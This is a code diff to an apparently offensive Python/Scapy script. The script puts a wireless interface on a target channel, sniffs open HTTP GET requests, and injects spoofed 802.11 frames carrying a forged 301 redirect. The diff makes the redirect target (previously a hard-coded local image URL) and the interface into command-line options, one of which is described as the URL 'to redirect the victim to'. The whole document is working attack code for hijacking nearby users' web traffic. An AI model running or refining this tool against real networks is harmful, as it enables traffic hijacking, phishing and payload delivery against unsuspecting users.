@@ -15,20 +15,19 @@ def set_monitor_mode(interface):
 
 # Sniff packets for HTTP
 def packet_handler(packet):
-
+	url = args.url.encode()
 	http_response = (
 		b"HTTP/1.1 301 Moved Permanently\r\n"
-		b"Location: http://192.168.16.100/alex.jpg\r\n"
+		b"Location: %b\r\n"
 		b"Content-Length: 0\r\n"
 		b"\r\n"
-		)
+		) % url
 	if packet.haslayer(TCP):
-		global evil_payload
 		if packet[TCP].dport == 80:
 			
 			#802.11 Stuff
-			get_request = bytes(packet[TCP].payload)
-			if b"GET" in get_request:
+			request = bytes(packet[TCP].payload)
+			if b"GET" in request:
 				new_dst_mac = packet[Dot11].addr2
 				new_src_mac = packet[Dot11].addr1
 				wifi_frame = Dot11(type=2, subtype=0, FCfield="from-DS", addr1=new_dst_mac, addr2=new_src_mac, addr3=new_src_mac)
@@ -43,7 +42,7 @@ def packet_handler(packet):
 				print(f"I see http traffic coming from {new_dst_ip}")
 			#Payload
 				evil_payload = RadioTap() / wifi_frame / LLC() / SNAP() / IP(dst=new_dst_ip, src=new_src_ip) / TCP(sport=80, dport=client_port, flags="PA", seq=seq_num, ack=ack_num) / raw(http_response)
-				sendp(evil_payload, iface="wlan1mon")
+				sendp(evil_payload, iface=args.interface)
 			
 
 
@@ -56,6 +55,9 @@ parser.add_argument("-i", "--interface", required=True, help="Interface used to 
 
 #Specify Channel
 parser.add_argument("-c", "--channel", required=True, help="The channel of the target")
+
+#Specify http website to redirect the victim to
+parser.add_argument("-u", "--url", required=True, help="The URL to redirect the victim to")
 args = parser.parse_args()
 
 subprocess.run(['iw', 'dev', args.interface, 'set', 'channel', args.channel])
